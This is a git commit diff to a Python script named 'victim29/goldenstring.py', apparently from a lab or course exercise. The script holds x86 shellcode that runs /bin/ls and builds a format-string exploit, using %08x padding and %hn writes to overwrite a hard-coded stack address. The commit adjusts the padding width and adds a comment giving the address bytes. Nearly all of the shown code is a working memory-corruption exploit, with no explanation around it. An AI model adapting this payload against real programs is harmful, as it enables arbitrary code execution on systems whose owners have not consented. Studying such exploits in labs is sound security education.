26a3fa883424ea6d1db474b67e66433170cbbc26
Stephen Dean <stephendean2016@gmail.com>
2022-10-20 00:08:12 -0500

    fdsf

--- victim29/goldenstring.py
+++ victim29/goldenstring.py
@@ -4,6 +4,7 @@ import os
 SHELLCODE = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/ls"
 
 ADDRESSTOWRITE = b'BFFFE58C'
+                 #8C E5 FF BF
 ADDRESSTOWRITE1 = int(ADDRESSTOWRITE, 16)
 ADDRESSTOWRITE1 = ADDRESSTOWRITE1.to_bytes(4, 'little')
 ADDRESSTOWRITE2 = int(ADDRESSTOWRITE, 16) + 0X2
@@ -16,4 +17,4 @@ LENTGHOFREQUIRED = 61
 
 #print("AAAA" + str(ADDRESSTOWRITE1)[2:18] + str(ADDRESSTOWRITE2)[2:18] +  "%08x." * 320)
 with os.fdopen(sys.stdout.fileno(), "wb", closefd=False) as stdout:
-    stdout.write(ADDRESSTOWRITE1 + b'AAAA' + ADDRESSTOWRITE2 + b'%08x'*316 + b'%33529x' + b'%hn' + b'%08x' +  b'%hn' + b'\n')
+    stdout.write(ADDRESSTOWRITE1 + b'AAAA' + ADDRESSTOWRITE2 + b'%08x'*316 + b'%33521x' + b'%hn' + b'%08x' +  b'%hn' + b'\n')
